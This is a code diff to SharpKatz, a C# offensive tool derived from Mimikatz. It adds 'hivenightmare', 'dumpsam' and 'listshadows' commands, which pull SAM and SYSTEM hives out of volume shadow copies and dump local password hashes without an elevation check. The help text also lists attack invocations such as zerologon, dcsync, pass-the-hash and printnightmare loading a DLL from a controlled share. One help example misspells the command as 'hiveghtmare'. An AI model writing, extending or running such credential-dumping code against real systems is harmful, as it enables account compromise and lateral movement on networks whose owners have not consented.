@@ -45,6 +45,8 @@ namespace SharpKatz
             string machineaccount = null;
             string nullsessionStr = null;
             string library = null;
+            string system = null;
+            string sam = null;
             bool showhelp = false;
 
             OptionSet opts = new OptionSet()
@@ -76,6 +78,9 @@ namespace SharpKatz
                 { "ForceNtlm=", "--ForceNtlm [forcentlm]", v => forcentlmStr = v },
 
                 { "Library=", "--Library [library]", v => library = v },
+
+                { "System=", "--System [systempath]", v => system = v },
+                { "Sam=", "--Sam [sampath]", v => sam = v },
 
                 { "Altservice=", "--Altservice [alternative service]", v => altservice = v },
                 { "h|?|help",  "Show available options", v => showhelp = v != null },
@@ -146,6 +151,9 @@ namespace SharpKatz
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --User krbtgt --DomainController WIN-NSE5CPCP07C.testlab2.local");
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll");
                 Console.WriteLine("[*] Example: SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom");
+                Console.WriteLine("[*] Example: SharpKatz.exe --Command hiveghtmare");
+                Console.WriteLine("[*] Example: SharpKatz.exe --Command dumpsam --System \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM --Sam \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM ");
+                Console.WriteLine("[*] Example: SharpKatz.exe --Command listshadows");
                 return;
             }
 
@@ -154,7 +162,7 @@ namespace SharpKatz
 
             if (!command.Equals("logonpasswords") && !command.Equals("msv") && !command.Equals("kerberos") && !command.Equals("credman") &&
                 !command.Equals("tspkg") && !command.Equals("wdigest") && !command.Equals("ekeys") && !command.Equals("dcsync") &&
-                !command.Equals("pth") && !command.Equals("zerologon") && !command.Equals("printnightmare")) 
+                !command.Equals("pth") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") && !command.Equals("listshadows") && !command.Equals("dumpsam")) 
             {
                 Console.WriteLine("Unknown command");
                 return;
@@ -175,7 +183,7 @@ namespace SharpKatz
                 return;
             }
 
-            if (!command.Equals("dcsync") && !command.Equals("zerologon") && !command.Equals("printnightmare"))
+            if (!command.Equals("dcsync") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") && !command.Equals("listshadows") && !command.Equals("dumpsam"))
             {
 
                 if (!Utility.IsElevated())
@@ -395,27 +403,69 @@ namespace SharpKatz
                     }
                     else
                     {
-                        if (string.IsNullOrEmpty(library))
+                        if (command.Equals("printnightmare"))
                         {
-                            Console.WriteLine("[x] Missing or incorrect required parameter -> Library");
-                            return;
-                        }
+                            if (string.IsNullOrEmpty(library))
+                            {
+                                Console.WriteLine("[x] Missing or incorrect required parameter -> Library");
+                                return;
+                            }
 
-                        if (string.IsNullOrEmpty(target))
+                            if (string.IsNullOrEmpty(target))
+                            {
+                                Console.WriteLine("[x] Missing or incorrect required parameter -> Target");
+                                return;
+                            }
+
+                            Module.PrintNightmare.RunPrintNightmare(target, library, authuser: authuser, authdomain: authdomain, authpassword: authpassword);
+                        }
+                        else
                         {
-                            Console.WriteLine("[x] Missing or incorrect required parameter -> Target");
-                            return;
-                        }
+                            if (command.Equals("hivenightmare"))
+                            {
+                                List<string> copies = Module.Shadow.ListShadowCopies();
+                                if(copies.Count > 0)
+                                {
+                                    Console.WriteLine("[*] Using shadowcopy {0}", copies.ToArray()[0]);
+                                    Console.WriteLine("[*]");
+                                    string systempath = string.Format("{0}Windows\\System32\\config\\{1}", copies.ToArray()[0], "SYSTEM");
+                                    string sampath = string.Format("{0}Windows\\System32\\config\\{1}", copies.ToArray()[0], "SAM");
 
-                        Module.PrintNightmare.RunPrintNightmare(target, library, authuser: authuser, authdomain: authdomain, authpassword: authpassword);
+                                    Module.Sam.LsadumpSam(systempath, sampath);
+                                }
+                                else
+                                {
+                                    Console.WriteLine("[x] No shadowcopy found");
+                                }
+                            }
+                            else
+                            {
+                                if (command.Equals("dumpsam"))
+                                {
+                                    if (string.IsNullOrEmpty(system))
+                                    {
+                                        Console.WriteLine("[x] Missing or incorrect required parameter -> System");
+                                        return;
+                                    }
+
+                                    if (string.IsNullOrEmpty(sam))
+                                    {
+                                        Console.WriteLine("[x] Missing or incorrect required parameter -> Sam");
+                                        return;
+                                    }
+
+                                    Module.Sam.LsadumpSam(system, sam);
+                                    
+                                }
+                                else
+                                {
+                                    Module.Shadow.ListShadowCopies();
+                                }
+                            }
+                        }     
                     }
                 }
-
             }
         }
-
-
-
-
     }
 }
